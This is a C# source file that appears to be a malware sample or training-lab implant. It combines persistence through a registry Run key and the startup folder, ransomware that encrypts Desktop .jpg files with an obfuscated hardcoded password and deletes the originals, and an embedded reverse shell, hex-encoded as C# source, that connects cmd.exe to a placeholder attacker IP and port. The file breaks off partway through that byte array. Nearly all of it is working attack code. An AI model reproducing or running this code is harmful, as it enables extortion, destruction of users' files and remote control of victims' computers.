using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Reflection;



// Used for run key
using Microsoft.Win32;

// Used for reverse shell
using System.Net.Sockets;

// Used for encryption
using System.Security.Cryptography;
using System.Threading;

namespace kcik
{
    class Program
    {

        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);
        public static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".aes", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;


            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static void Main(string[] args)
        {
            // check if it is already running
            //check();
            //persistence 2 ways
            //run key 
            //pers_a();
            //startup folder
            //pers_b();

            //ransomware
            //encrypt sample files txt aes + password
            //ransom();
            //phone home reverse shell
            phone_home();

        }

        public static void check()
        {
            
            Process p = Process.GetCurrentProcess();
            string cMyProcessName = p.ProcessName;
            int counter = 0;
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains(cMyProcessName) )
                {
                    counter++;
                    if (counter > 1)                
                        Environment.Exit(1);
                }
                else
                {
                   
                }
               }
            

        }

        public static void pers_a() 
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName))
            {
                    File.Copy(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            var rWrite = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rWrite.SetValue("SVCrmHost", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName);
            
        }
        public static void pers_b()
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName))
            {
                File.Copy(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            
        }
        public static void ransom() {
            
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

            string password = String.Concat(chars.Substring(4,1)+ chars.Substring(0,1) + chars.Substring(14,1) + chars.Substring(14,1) + chars.Substring(32,1) + chars.Substring(0,1) + chars.Substring(0, 1) + chars.Substring(14, 15) + chars.Substring(14, 1) + chars.Substring(32, 1) + chars.Substring(0, 1) + chars.Substring(0, 1) + chars.Substring(14, 1) + chars.Substring(14, 1) + chars.Substring(32, 1) + chars.Substring(0, 1));
            

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("desktop path {0}", desktop);
            string[] fileEntries = Directory.GetFiles(desktop);
            foreach (string fileName in fileEntries)
            {
                if (fileName.EndsWith(".jpg"))
                {
                    FileEncrypt(fileName, password);
                    File.Delete(fileName);
                }
            }
            
        }

        public static void phone_home() { 
            byte[] byteRS = new byte[2945] { 0xEF, 0xBB, 0xBF, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x3B, 0xD, 0xA, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x3B, 0xD, 0xA, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x49, 0x4F, 0x3B, 0xD, 0xA, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x73, 0x3B, 0xD, 0xA, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x4E, 0x65, 0x74, 0x2E, 0x53, 0x6F, 0x63, 0x6B, 0x65, 0x74, 0x73, 0x3B, 0xD, 0xA, 0xD, 0xA, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x53, 0x68, 0x61, 0x72, 0x70, 0x54, 0x68, 0x72, 0x6F, 0x75, 0x67, 0x68, 0xD, 0xA, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x20, 0x63, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x52, 0x53, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x3B, 0xD, 0xA, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x76, 0x6F, 0x69, 0x64, 0x20, 0x4D, 0x61, 0x69, 0x6E, 0x52, 0x53, 0x28, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x69, 0x70, 0x20, 0x3D, 0x20, 0x22, 0x7C, 0x49, 0x50, 0x41, 0x44, 0x44, 0x52, 0x45, 0x53, 0x53, 0x7C, 0x22, 0x20, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x69, 0x6E, 0x74, 0x20, 0x70, 0x6F, 0x72, 0x74, 0x20, 0x3D, 0x20, 0x7C, 0x54, 0x43, 0x50, 0x50, 0x4F, 0x52, 0x54, 0x7C, 0x20, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x28, 0x54, 0x63, 0x70, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x20, 0x63, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x54, 0x63, 0x70, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x28, 0x69, 0x70, 0x2C, 0x20, 0x70, 0x6F, 0x72, 0x74, 0x29, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x28, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x20, 0x3D, 0x20, 0x63, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x2E, 0x47, 0x65, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x28, 0x29, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x28, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x52, 0x65, 0x61, 0x64, 0x65, 0x72, 0x20, 0x72, 0x64, 0x72, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x52, 0x65, 0x61, 0x64, 0x65, 0x72, 0x28, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x29, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x28, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x20, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x28, 0x29, 0x3B, 0xD, 0xA, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x70, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x46, 0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x20, 0x3D, 0x20, 0x22, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x22, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4E, 0x6F, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x20, 0x3D, 0x20, 0x74, 0x72, 0x75, 0x65, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x55, 0x73, 0x65, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x20, 0x3D, 0x20, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x52, 0x65, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x3D, 0x20, 0x74, 0x72, 0x75, 0x65, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x52, 0x65, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x20, 0x3D, 0x20, 0x74, 0x72, 0x75, 0x65, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x2E, 0x52, 0x65, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x3D, 0x20, 0x74, 0x72, 0x75, 0x65, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x20, 0x2B, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x28, 0x43, 0x6D, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x61, 0x74, 0x61, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x20, 0x2B, 0x3D, 0x20, 0x50, 0x5F, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x52, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x52, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x29, 0x3B, 0xD, 0xA, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x77, 0x68, 0x69, 0x6C, 0x65, 0x20, 0x28, 0x74, 0x72, 0x75, 0x65, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x2E, 0x41, 0x70, 0x70, 0x65, 0x6E, 0x64, 0x28, 0x72, 0x64, 0x72, 0x2E, 0x52, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x29, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2F, 0x2F, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x2E, 0x41, 0x70, 0x70, 0x65, 0x6E, 0x64, 0x28, 0x22, 0x5C, 0x6E, 0x22, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x2E, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x2E, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x2E, 0x52, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x28, 0x30, 0x2C, 0x20, 0x73, 0x74, 0x72, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x2E, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x76, 0x6F, 0x69, 0x64, 0x20, 0x50, 0x5F, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x28, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x73, 0x65, 0x6E, 0x64, 0x65, 0x72, 0x2C, 0x20, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x41, 0x72, 0x67, 0x73, 0x20, 0x65, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x20, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x65, 0x72, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x21, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x2E, 0x49, 0x73, 0x4E, 0x75, 0x6C, 0x6C, 0x4F, 0x72, 0x45, 0x6D, 0x70, 0x74, 0x79, 0x28, 0x65, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x29, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x74, 0x72, 0x79, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x2E, 0x41, 0x70, 0x70, 0x65, 0x6E, 0x64, 0x28, 0x65, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x2E, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x28, 0x73, 0x74, 0x72, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x57, 0x72, 0x69, 0x74, 0x65, 0x72, 0x2E, 0x46, 0x6C, 0x75, 0x73, 0x68, 0x28, 0x29, 0x3B, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x63, 0x61, 0x74, 0x63, 0x68, 0x20, 0x28, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x65, 0x72, 0x72, 0x29, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7B, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x7D, 0xD, 0xA, 0xD, 0xA, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x76, 0x6F, 0x69, 0x64, 0x20, 0x43, 0x6D, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x61, 0x74, 0x61, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x28, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x73, 0x65, 0x6E, 0x64, 0x69, 0x6E, 0x67, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x2C, 0x20, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x41, 0x72, 